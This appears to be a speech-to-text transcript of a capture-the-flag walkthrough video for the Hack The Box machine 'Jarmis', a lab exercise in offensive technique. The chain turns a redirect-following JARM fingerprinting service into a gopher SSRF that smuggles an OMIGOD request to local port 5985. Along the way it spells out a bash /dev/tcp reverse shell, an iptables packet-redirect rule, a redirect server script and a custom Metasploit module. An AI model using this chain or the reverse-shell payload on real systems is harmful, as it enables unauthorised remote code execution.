 what's going on youtube this is ipsec i'm doing jarmus from hack the box which was used on the uhc september finals that is the ultimate hacking championship and this box has a special place in my heart not only because i created it but it's probably one of the favorite boxes i created because it was modeled after a service i had wish existed and maybe i'll follow through with this box and harden it and actually make it that service which is just an application to try to find malicious tls servers essentially it gets a fingerprint of how ssl is configured using germ a technique by salesforce and then if it thinks it is malicious based upon germ it would go and query it for more metadata such as the hearst headers cookies etc and that is where the vulnerability comes in i did not specify not to follow redirects and the request library so if it goes and queries a server and it sends it a 301 redirect you can direct the service to other places including the gopher protocol this service is supposed to be hosted on azure so port 5985 and 5986 is open and vulnerable to omigod so you have to use that redirect like a server-side request forgery to go to gopher to do an http smuggling attack of the oh my god exploit and i mean i just really love that exploit chain so let's jump in as always i'm going to start off with the nmap so instead of dash c actually i'm going to do dash p dash to do all ports because this is uhc and it's a competition so i don't want to spend a lot of time waiting for my first step of recon to finish because i can't really begin until this finishes so i'm going to do dash p dash all ports 136535 dash v show me airports as it finds it and then i have to make the directory end map so i can place my result in there and we can call this uh jrms all ports and then the ip address 192.168.1.170. and we can see just two ports are open ssh and http so before i go take a look at the actual web service let's start our regular nmap scan so this dash p dash is just gonna be dash p 22 80 and i can do dash sc for default scripts sv enumerate versions and we'll go here take off that all ports so now we're doing a regular nmap scan on the box while we take a look at it so 192 168 1.170 is what i said and we go there we get jermis as the title and it just says loading so what i'm going to do is press f2 go to the network tab and again i'm doing this just within firefox i'm not going to burp suite yet because i'm faster this way about like competition stuff it's all about time so anything you can shave off is nice so we can see it's trying to request jermis.htb i'm not getting anything here because it is just timing out so let's do sudo vi etsy host and add jarmus.htb so 192 168 1.170 germas.hdb save that file refresh the page and now we get a blocked icon so going over to the console tab we can see the cross origin request blocked because same origin policy disallowed us redirecting to a domain name when we used an ip address so just instead of doing ip we do dramas.htb and we have a website so we can test this out do one here we get a signature so now that we have this i'm just gonna test like is this html looks like it is try php uh not found so right now my thought is this is a static website or some type of um javascript framework i press ctrl u and it's looking more like probably uh something in like javascript so react or view or something probably like react just because i don't see what would look like view but some javascript framework now while i'm going to be poking at it i'm going to run a go buster because again always do recon in the background this has finished we can see ssh it's an ubuntu server engine x also is telling us ubuntu and its web server is nginx generally when i see nginx i don't think php first i just because it's more work to set up php on nginx and it is apache and most php guys recommend apache so go busted dir dash u http jarmus.htb dash w forward list opt sec list uh discoverywebraftsmallwords.txt and then we'll just do dash out for outfile and we'll call it growbuster.out and again i'm not using any arguments because um it didn't discover any so we have slash docs slash api and static now one thing also i did not mention is that open api dot json file uh generally when you have that you have um was it here i saw it yeah on this page let's reload the openapi.json if we go to it it will describe a lot of things so this and we get information about the api um go buster discovered the slash api endpoint and here we have it and this saying api v1 search signature saying how to use it um most things that generate that file will also generate the docs directory which is swagger and then also there is a little known one that redoc also exists and this is just a different format to show that type of documentation i don't think this lets me do like examples in the web browser like swagger does so i'm going to switch over to swagger so what you saw me doing here i'm like clicking i can't really edit too much if i click this get uh it doesn't let me type there so if i just go to slash docs and i go here i can say try it out and i can actually like debug this in my browser which is really cool so looking at the webpage is all about jarm and germ is very similar to like um ja3 or j3 j3s hashes and that it's a way to fingerprint tls so it a germ is 62 characters it's non-random at least the first 32 or 30 characters are non-random last 32 are random but fingerprint ssl services if you want to know more about it than just what's on that basic api page i just recommend googling jarm tls maybe let's see what this does oh yeah the salesforce engineering here's a big blog first about it um super cool to identify tls services so the first 32 character the first 30 characters are going to be all about the ssl configuration germ is going to send 10 different open ssl not open cell some 10 different tls hellos to try to fingerprint everything the server supports and creates a 30 character signature based upon that it's important to say it's signature not hash maybe fuzzy hash is how they call it but i'm being specific about that because it's non-random data so if you see like the first 30 characters of two different things are very similar they have very similar ssl configurations it's not a hash where if one bit differed it would be completely different the last 32 characters is going to be the sha 256 sum of extensions and i know sha 256 is greater than 32 characters it is just a truncated version so this is going to be the server so if i ran like a python web server and a go web server and i had them both exactly configured the same with ssl they'd still differ because the extensions python supports is different than go even like the extensions may change between go versions if you run sliver with like go one six and go one seven it's gonna have a different germ because the go length thing just changed internally between those two versions but lastly um just like any like tls fingerprinting full collisions are possible and super likely um this is gonna be why like when we dump the whole database i don't have any python c2s like kodiak or empire because if you just stood up a python web server and did the basic ssl it would collide with everything and make this challenge a lot easier so we remove those so they are possible that is why this service also utilizes metadata when deconfliction is necessary and we'll come back to this hint in a little bit but first let's just experiment with the api we can just use this to grab things so we can see a signature here and then if i go down to the search signature page we can try it out and it tells us what it's for search all signatures with a germ so we can paste that signature in and we get the germs that is the same signature so it looks like yahoo.co.jp is listening on a few ip addresses but has all the same drum signature and then finally we have fetch and this says query an endpoint to receive its germ and fetch metadata if it's malicious so we can just try going to google.com and if you do this on hackthebox's website this one may not work you have to stamp your own tls server because the box does not have internet but you can see it is querying google's germ in real time so we can also do all the same things through the front end and this front end was coded by a friend waldow um i did the back end he did the front end because i am not a javascript guy and he is so we can see exactly how this works we can grab again this hash go to fetch signature or search signature grab it go to fetch germ type in google.com and everything seems to be working through the front end now if we wanted to um one of the cool things about germ you can actually query showdown with it so i'm going to go to showdan.io let's just log in real quick i'm not gonna tell you my password it was password no it wasn't but let's just search a website um i'm gonna say github and i know this isn't how you search websites it's gonna get anything with like github in the name i don't really care i'm going to go to this ip and does this have https i hope it does um i'm going to click port 443 that's what we want so let's go to this website and if i search germ here we don't get anything because little known fact not everything is in the regular view of showdown if you go to raw data and search germ we get this string which is the germ and then you click it you can see how to search germs and showdan so let me go back twice real quick because i just want to show that string does not exist on the regular view page but you can search for germ with ssl.jarm so if we wanted to take the germ we had found we can just go here grab this germ go to showdan paste this in and we see 61 different results and it kind of looks like this may be the page it's a japanese thing yahoo so this said uh whoops it was actually a browser tab it was a japanese yahoo website but what i'm really interested in is anything that is malicious we can see is malicious false there are quite a bit of germs so if i do like a hundred it goes to amazon.in so what we want to do is grab them all the easiest way probably just reading the documentation and copying that curl command it does so it tells you exactly what to do so if i just ran like this curl request so i paste this and boom we have the hit so i'm gonna do v crawl dot sh paste the curl in and i'm gonna do a four i n is it range uh range 0 10 let's see sequence sequence is bash range i think is python so sequence 0 let's say 300 i don't know how many are in here but we'll just leave that done and we can specify dash o for out file and i'm going to do i dot json and for id we don't want to call the same thing 300 times so we're going to put i there and put this in double quotes not single quotes because i think it was single quotes it would not process this as a variable so there we go that looks good um makeder json and let's just move crawl in there and we'll call bash huh let me go into the directory i just moved it so bash crawl.json and oh god we have a lot of downloads and we have 100 or how high does this go 299.json let's see if there's any data in it if i cat it we have null so i'm going to grep for malicious on star and we can see all the hits that are if have it in it which is everything so let's do t instead of f and now we have all the ones that have true so we have dumped now a few malicious ones and let's see what is a fun one we can play with uh let's go about strike so we can see how many cobalt strikes are on shodan so if we go back here go to my showdown thing let's change this to be cobalt strikes and we can kind of see if there's many false positives just based upon what it's returning like the cookie so this one is returning like cookie php bb3 so i'm guessing this is a collision and not a kerbal strike team server 404 not found content security policy so i'm guessing not all these are going to be cobalt strike again this is a lot of collisions happening so that is why the application upon detecting a collision it grabs metadata from the website where is it let's say full collisions are possible that's why the service also utilizes meta metadata when deconfliction is necessary so i'm going to look back at this and i can see sliver cobalt go fish sliver async rat uh this one doesn't have anything i don't know what this is trick pot metasploit silent trinity here's a netcat one and i can see a bunch of zeros here and this is probably because netcat by default um won't like keep the connection alive once i connect and like i said before um the germ sends 10 different requests so it just accepts the first one and then all the other ones fail and then that's why you see so many zeros so we can kind of test this by just doing nc lvmp 443 dash ssl uh l and ssl are incompatible wait is it dash dash ssl yep so you can do sudo it's gonna generate a random certificate if i go back to jarmus i'm just going to use this field and see what my ip address is if i do ipaddr grep 192 i am oh f2 i think i'm 1.230 i think this will go back we can try this search no we want fetch https and paste this url and we have the drum back it's detecting it as not malicious and the note has ncat question mark and i think the reason why it's not malicious is because it tried to fetch metadata and couldn't and since it couldn't fetch the metadata it can't confirm this is ncat if we give it something that is definitely malicious it will probably remove that question mark so let's just run meta split real quick so sudo msfdb run and we'll start up a handler and put like reverse https there so use exploit multi handler set payload what is it i always forget the first one windows meterpreter x64 is it windows x64 interpreter is that the thing yep now we can do reverse https set l port two four four three run uh set l host to what is my adapter this would normally be ton zero but it is eth0 in this case we can run it and now when i go get it we see metasploit it grabs apache which i think is metasploit's default server header for here and because it's metadata matched the application's telling me true so now we have a hard part of finding out what happens after it sends a request well i already said that a germ is going to send 10 different requests so if we can use iptables we can grab 10 packets and then on the 11th packet direct it somewhere else after we do it with iptables i'm going to create a metasploit script just because that's a bit easier but iptables i think is the easiest way to show this so i'm going to stand this on 443. actually let's do the two netcats down here and we'll do iptables up top so let's grab this netcat and this is like completing the trifecta and janky routing if you didn't know i created like a kernel module and i think validation to do some fancy routing based upon ip address then we used iptables and subnetting to do another way and this way we'll use iptables to do something else really janky so we have netcat listening on four four three and eight four four three now we're going to create the iptable rule so sudo iptables we're going to do dash i for insert we could do dash a but dash a adds something to the bottom of a rule and dash i add something to the top of the chain i know i said rule before it's actually like chains and for this take effect you generally want to always have it at the top to make sure rule doesn't come before it that could change something so pre-routing table so before it does any routing it's going to be in the net we're going to say the protocols tcp which gives us the ability to specify uh the destination port and we can also also specify the destination address and it's going to be 1.230. so this is going to match a packet coming in to us now we're going to use the statistic module and we're going to say mode nth so this can be every nth packet and we're going to say every 11 starting at packet 10 and this packet number decrements so every packet is gonna get minus one then we're going to do dash j for action and redirect the 11th packet 2 port 8443 okay that looks good put that rule in and we're going to fetch the request and we get this failed ssl connection and then a connection back oops so the box is doing a get request to us and it's saying the user agent is curl and here is the second flag for uhc if you wanted the first flag you would grab all the drums that you captured and this isn't going to be on the hack the box platform because it's just two flags and it's user and root.text but for the actual competition we needed three and the json's here it's in 168 the note is not all dumps or exploits which is fun because i remember there was like there's always been posts about people just querying an api constantly to dump its entire database so i love this path for an exploit thing um anyways the server is doing a get request to us so the attack here actually is instead of like it doesn't get and we can redirect it somewhere else and it's a server side request forgery so if i do nc lvmp 70 if you know what port 70 is kudos to you but it's actually gopher so if i do curl 127.001 and specify go for colon slash we get the request and go for special because you can just put general text here and i can craft a packet so i can do like get uh is it percent 20. i can probably do plus probably percent 20 is a better one um site percent 20 http 1.1 percent 0d percent 0a host percent 20 for space 127.001 and this is like testing my knowledge of writing a hp packet by hand but i do this and then the gopher connects to port 70 and boom writes that request and if this is a follow it's going to make the server go to this new page so what the attack is doing is using this go gopher server side request forgery to make an http request from that server now the cool thing about server side request forgery is now that request comes from 12701 or it also comes from inside the corporate network so you can access other resources that you wouldn't normally be able to before we can really weaponize this we should find out what ports are accessible over 127.001 so what i'm going to do is a fetch germ and i'm just going to fetch 127.001 and we get all zeros i'm going to specify a port that probably exists 22 and it just says endpoint nothing let's do 23 click enter and still it's not really telling us anything if we do port 80 what happens we don't get anything but now what happens if i just change this instead of https because it doesn't listen on port 8 if i just put a regular http in still get nothing if we specify a port that doesn't exist nothing and what i'm also going to do for good measure is to analyze the request to make sure like the javascript engine isn't hiding anything from me so let's go to burp suite intercept is on i'm going to click go send this over here and we can see this is behaving exactly as the front end is telling us now there's a really cool bug that was completely unintentional if instead of using an ip address we use the hostname we get now endpoint is set to null and if we do a port that is listening let's say 22 it's actually going to give us the endpoint so now we have a way to query ports that are listening again like awesome so let's now go back to our crawl script and we're going to do all ports so let's go to um maker ports cp what was it uh json crawl copy that over into ports and we can just change this request slightly so this is searching id um we probably want to do something different actually uh is that locate not i'm gonna use all ports um we can probably just use wfaz honestly so let's use wfas to do this we just first have to look at exactly the request that is being made and we have that in burp suite so this is what we want whoops grab this and we can do w fuzz dash z range 1 to 65 535 for all ports and then paste this in and localhost fuzz and then dash dash hs for hide string and i'm going to hide everything with null and i think that's it let's see what did it just error on w fuzz options payload um i think it wants the url at the end or i need to specify oh wait i did not specify the actual url http jrms.hdb and we can specify that with dash u i think for url and there we go now we're fuzzing all open ports it's hit 22 and 80. those aren't a surprise to us and we're already at around 1000 so i'm going to pause the video and just let this keep on going oh whoa we had a lot that i did not expect oh there's a 502 so invalid gateway so weird we may want to hide error code 502 or hide yeah response 502 another 502 but we have 5986 open 8001 is open as well so we can query those so 5986 it gets translated to 127.001 and i think 5985 also well 5985 is behaving oddly it's just stuck on waiting no other port does that so 5985 i wonder if this is the 502 error that we're getting uh 5985 eventually returns with 200. so it just takes longer and returns with 200. we don't know what 8001 is but 59.86 um that's hit the news lately on linux it's oh my god not sure if you've known about it or not if you haven't there's been videos on my channel about the exploit it's been a really fun one so this looks like it's going to be a fun twist we have to use server side request forgery to exploit omigod 5986 is ssl so it's gonna be really hard just to throw strings to that socket because we have to complete a tls handshake in order to talk to it but 5985 is the plain text version of it so we can just jam the omigod payload on that socket and hope for the best so what i'm going to do is close out of this and we're going to copy oh my god i guess i can just go download the exploit again if you're not familiar with it oh my god github and let's uh turn intercept off and let's see where is oh my god github i don't know what just happened there with that search uh here we go horizon ai i think this looks fine we can copy this exploit get clone v or we can do cd cve 2021 and then we can edit oh my god uh we actually don't need to edit we just need to get this string onto um [Music] our clipboard so what i'm going to do is set this to go through a proxy actually so request right here we can say proxies is equal to http uh is this doing https this one is doing https so i'm just gonna do https colon http localhost 8080 to send this to burp suite and we can run oh my god against it doesn't really matter the ip address i'm just going to do 1.170 dash c we'll do um let's see let's do the bash reverse shell so we can do echo dash n we got to paste the base64 so i'm going to do echo dash n bash dash c wait we don't have to do that we don't do the bash c we can just do straight bash dash i devtcp 192.168.1.230 i think was me port 9001 0 and 1. and the reason why i didn't have to do the bash c here or i opted not to do it and i can do single quotes is because when we um execute this base64 payload we're already going to be executing with bash so i know bash is executing this reverse shell the reason why i always prep like fast jassy before here is because i'm sending this to a web server and the web server may be using like dash and not bash to execute the shell which doesn't have um like this capability to send a request to a network socket like this so base64-w0 and we have this so i can now put this in the header and let's see that's echo dash n base 64-d and pipe that to bash let's see we need dash t for target like that and this should have gone in burp suite we can drop this request drop that one drop that and here we go we have the omi god request so now we have to stand up a web server to handle this or send this request so we can probably just use a regular python i'm trying to think that gopher we can let's see i think we have to use ssl so we have the payload now we got to build the server to execute it so what i'm going to do is open up a well if we can close this and just use the same pane i'm going to try to stay organized which is always tough to do i'm going to make dirt dub dub dub and now we can begin the work so the first thing is we have the generate asl shirt so i'm going to use open ssl request x509 dash new key rsa4096 keyout key.pam out cert.pam days 365. and we don't want a passphrase so i'm going to do dash no des all the defaults and we should have cert.pem and cat this is key.pem okay so let's do v um serve dot pi i guess we can do from http server import http server base http request handler and then import ssl class main handler this is just like the skeleton code for um simple http server or http dot server nowadays so that def do get self print get it's all i want to do right now so now we got to set the socket up httpd http server listen on quad zeros on port 8443 and the class we want to do is main handler and now we have to set up the socket so hdbd.socket is equal to ssl wrap socket http dot socket and then key file is equal to probably key.pem and then cert file is equal to cert.pem server side is equal to true and then we can do httpd.serv forever and let's see where i made a typo server side true let's see uh made the typo here oh let's see bast it's base here we go this needs to be underscore i think there we go so if i curl https localhost 8443. self sign certificate dash k and we say get so now what we can do is um instead of printing get we can also set the headers so self send response 301 self send header wedding the location header going to be gopher 127.001 59.85 and then this will be where the html goes i'm not html but ht url and code to payload but again just testing if this works so nc lvmp 5985 execute this we can do a curl https 12701 8443 specify dash k and empty request oh i don't think curl is by default following the request so i'm going to do also dash i and v and we can see let's see unsupported method head let's not do the dash i we do this get slash did not send the redirect let's send this to burp suite so go to the browser turn it on https localhost 8443 should go to the proxy tab we can drop that request send that one to repeater go and it is not sending us anything so we have something wrong so we probably have to end the headers like that set response click go there we go so now we got 301 moved permanently and the new location is gopher so if i use this now and just curl this uh it's not following the gopher payload but we can see we get this so if we wanted to we can test if this is going to work so we can say serve.pi and the gopher is going to go back to us so i'm just going to say um 192 168 1.230 because that's my ip of my box we can leave it at that port and we can say um please subscribe i guess so if on this socket nclvmp 59.85 i get please subscribe i always already listening then we'll know it worked so sudo nc lvmp 443 dash ssl or ssl and python3 serve dot pi so if i go back to this and say fetch https 192.168.1.230 on port 443. it's going to discover that this netcat is malicious and then redirect me to this web server which is then going to redirect the browser down here sent we got this connection we gotta get and server connects to us and says please subscribe so we know this is going to work now the one difficult thing about this exploit is going to be knowing to um change the location or not the location the header size and by header size i think i mean content length oh man it's been a long video but the reason for that is if we pipe this to output and rerun this exploit so click send now we're rerunning it we got a connection back it's not outputting because we directed all output to output if i xxd this we can see after please subscribe it is adding two bytes that is the go for payload for terminating it so if i just connect so let's run this output two and nc localhost 5985 or actually let's just do an http so a curl 127.00159 85 close this less output two actually xxd output two uh and end with zod zero a twice but i don't know how to show this now um the gopher is always going to append two things to the body i think maybe i'd have to do a post request let's try output two again we can say curl this dash x please subscribe is that going to uh maybe it's dash d for data there we go let's look at output two there we go yeah so the body on a http request does not end with zero d zero a so that's why it's not being appended so that's going to be the main part of the challenge is being able to discover that is happening blindly so when we go back to the payload we want to run which is this we're going to want to increment this content length by two and i'm going to highlight everything we're going to convert selection url actually before i do this let's highlight this burp suites magic 9001 is where i sent the request so copy this change url encoding key let's do all characters so we have just one big blob we can now go to the server so vi serve and change the location to be that nasty string and oxdf's going to probably create a more elegant way to do this um this is just how i'm doing it and by more elegant both me and him troubleshooted his method for quite a while trying to get it to work and mine just worked pretty quickly so his is easier to change commands with mine just hand jam and hope for the best so we can run that and go back to a fetch so repeater this and we should and see lvnp9001 so send this request got here got this term and we're waiting for reverse shell and do not get one so something did not work which is sad this is the painful part to debug server site request forgeries are not always easy to debug let's now decode everything and i'm just going to run this payload and see if we get a reverse shell so first check payloads payload works so that is not the issue we can exit so the next thing what could be wrong looking at this it's saying opposed to ws man host 5986 maybe we should change that to 59.85 and let's see what am i doing v serve dot pi location oh this needs to be 127.01 i never updated this back so it sent me data on 59.85 so let's put that to localhost and try again serve.pi netcat listen on 9001 send the request boom boom boom and now we are root on the box and we can go to slash root and cat flag dot text and that will be the entire box um i'm gonna go back and we'll do this with metasploit but before i do it if you're having trouble with this ip table to do the forwarding thing and you're trying to reset the counter this is a super annoying thing i've mentioned it before but if you just do iptables dash capital f to flush it's not going to actually flush all the rules just like dash l we're not going to see our pre-routing rule because you have to specify tnat so anytime you make a request to port 443 on yourself and you don't do it this way your whole counter gets messed up and you're no longer going to send the 11th packet over to your um malicious server so to reset that you do um let's see dash t nat capital f and then redo the iptables command uh where is it it's in pain zero i think pre-routing and that's not it um is it this top pane yeah so you'd have to probably want to put like pseudo iptables dash tnat dash capital f like that and just keep this command on go so what that's going to do flush the dat table then redo your pre-routing rule so you reset that counter but if you didn't want to use ip tables all altogether metasploit is another good option so to do it with metasploit we just want to look for a module that's already starting a web server so i'm going to run msfdb and i'll do use auxiliary server http maybe what are the options here use auxiliary server capture and there is some uh http stuff here so i'm just going to look for http underscore ntlm.rb so locate this file to find out what directory it's in so it's and user share metasploit auxiliary server capture and i'm going to go into this server and what we want to do is just do a wc against all http programs and we'll say dash l for line count because we just want to pick the most basic one and funnily enough http basic is so we're just grabbing a script that doesn't have many lines because we won't have to edit that much i also have to create the directory sudo su and we can makeder.msf4 i think okay it already exists so we can go in there and then make dirt dash p modules auxiliary server capture and let's copy http basic into that directory so msf4 modules auxiliary server capture so now that we're here let's edit the script so this module requires metasploit that's fine auxiliary that's fine i'm looking for like basic or something so this name we can update this so this is going to be just oh not mean delete that whole line so the name let's do http um redirect and description setup and i think there's one more indent set up an http server and redirect okay that doesn't go in quotes i think that's weird we'll put the author ipsec and then actions uh we're not capturing we're now redirecting and this is just going to be run redirect web server passive action um maybe redirect i don't know exactly what this is default action redirect okay so now it's going to be registering options uh we need servport that's good uh redirect url that's good and i'm also going to create another one called ssl because it looks like this one does not have it so opt full dot new ssl and what is this code look like so i'm going to exit dash f that's not what i want we can just exit here less go back into the capture server and let's find one that has that option so capture http mtlm ssl let's go into that directory grep dash i ssl http star see none of these have it weird so let's see i want to say it is a boolean and then this will be the description so negotiate ssl and then another boolean i think that's default so if we error out it's probably going to be around here and uh ipv6 we don't need it default run we don't have a realm and that's going to exploit we're not stealing creds so i'm just going to delete this report cred function and then on request url so we don't have a concept of a authorization header so we can remove this we aren't reporting any credentials we can remove that but we do have redirect url and we send the redirect so cli datastore redirect url else um we just send response and that may be it of the program uh this send response um test i have no idea what this will do but okay so now we have http basic dot rb so let's rename this to http forward and then when we do sudo msfdbrun we may be able to use this module if we did everything correctly so let's copy this use http basic ntlm uh no it's like a rebuild cache let's see the following modules could not be loaded c log for details so we did something wrong bless unexpected that expecting end on line 3433 so let's go back here http 33. so it is here let's see i'm guessing we did not open or close something correctly so this parenthesis does match these quotes match these brackets match so true comma these double quotes match and that is good we didn't modify up here so i don't think that's going to be the issue and that's closed that's fine that's closed register options that's all closed we're going to end here i'm not seeing the error but it's probably a case of me being blind so we do if here well let's get rid of that if then i think that means we get rid of and and maybe maybe not do we use if n anywhere else so that ends this def let's try it exit dash f run it and we'll look at the logs again when we can't load it so can't load it look at the log forward so expected end of input expecting end expecting end syntax error 33 so it doesn't like that optimal piece everything is terminated properly oh wait there's a comma at the end of here no comment there see if that fixes it i know there's a command to um rebuild the modules don't know if it's not my head so that's why we're doing this every time so i don't see ford failing to load which is a super good sign let's use it so use capture this and let's see http underscore forward show options show options if i type it correctly we got server port let's set srv port to 443 set ssl true it already is we can i think just run it and now if i curl dash capital i on this ip address with dash k v let's see if we get the redirect we do so it's moved and the location is nothing because we did not set a redirect url and do jobs kill zero show options set redirect url to b uh let's see we can just redirect them to our python web server so https 192.168.1.230. so we set this it could also be set to like that gopher thing but this is the easier way to just run it so when we run this now we can run our web server do i still have it don't have it running so exit the pane restart it ls we did it in www python3 serve.pi and i gotta remember this starts on um or runs on eight four four three so now when i run that if i do a curl https here c k it redirects us to this web server am i printing out whenever i get something b serve print get i am so and see lvmp 9001 we can go back to germas and fetch or maybe i was using it in burp suite so we're going to go to metasploit metasploit is going to send a redirect that redirect is going to go here and then this is going to send it to oh my god it's going to do http smuggling to go to port 5985 which then exploits it and sends us a reverse shell to 9001 it's a long attack chain so we send it redirecting client to here and nothing but a serve is not sending anything i expected to see uh get but i'm not seeing anything let's see curl k https 127.001 empty reply for server slash t so dash v let's see what am i screwing up we do the get and then it dies what this literally just worked the last part of the video it's nothing different about this set true we're ending the headers that's that crappy like code to send the payload so on git we should print get and then send response python3 server oh eight four four three yeah so we get like that ping one nine two one six eight one two 230 ipadr grep230 that is my ip so why does this not follow curl dash k dash i dash v oh um so it will do the redirect if we give it this full url but if i don't give it this url we get just that empty error and this isn't printing any um error logs so what i have to do is just go back here and give it the full url put a space there and this will work i'm somewhat confident maybe half confident work send boom we got it redirecting client to this server and then getting a shell um i think we'd probably be able to use metasploit to just send the gopher payload but i'm not positive i guess we can test it real quick since i have nothing but time right now so let's do v serve dot pi and let's copy this whole redirect uh i can copy the quotes too that should be fine let's see probably want to do it and cat serve dot pi if i didn't vi my copy and paste would be weird so that's why i didn't cat let's copy everything and then set redirect url that's not it set redirect url paste this whole thing and this is going to be kind of curious if it works ncl vmp okay so that is all set i think i put a single quote at the start of it we'll try it looks good let's just run it and this is going to be interesting so copy this whole url paste it here listening on 9001 this web server is done send it and yes we can do it with just metasploit by pasting the url that way so that'll be the box hope you guys enjoyed it take care and i will see you all next week